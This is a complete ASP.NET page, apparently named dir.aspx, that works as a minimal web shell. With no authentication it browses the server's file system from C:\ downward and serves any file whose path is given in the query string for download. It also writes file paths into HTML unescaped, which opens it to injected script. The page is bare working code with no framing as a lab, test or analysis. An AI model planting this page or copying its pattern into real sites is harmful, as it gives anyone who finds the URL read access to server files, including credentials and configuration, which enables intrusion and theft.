<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%
string action = Request.Params["action"];
string path = Request.Params["path"];
if (action == null) {
	action = "dir";
}
if (path == null) {
	path = "c:\\\\";
}

if (action.Equals("dir")) { %>
<ul>
	<% foreach (var dir in Directory.EnumerateDirectories(path)) { %>
	<li><a href="./dir.aspx?action=dir&path=<%= dir %>"><%= "[d] " + dir + "\\" %></a></li>
	<% } %>
	<% foreach (var file in Directory.EnumerateFiles(path)) { %>
	<li><a href="./dir.aspx?action=file&path=<%= file %>"><%= file %></a></li>
	<% } %>
</ul>
<% }

if (action.Equals("file")) {
	string content = "File does not exist or not enough permission...";
	using (var streamReader = new StreamReader(path)) {
		content = streamReader.ReadToEnd();
	}

	string filename = Path.GetFileName(path);
	string mimetype = MimeMapping.GetMimeMapping(filename);

	Response.Clear();
	Response.AddHeader("Content-Disposition", "filename=\"" + filename + "\"");
	Response.AddHeader("Content-Type", mimetype);
	Response.WriteFile(path);
	Response.Flush();
	Response.End();
	Response.Write(mimetype);
} %>


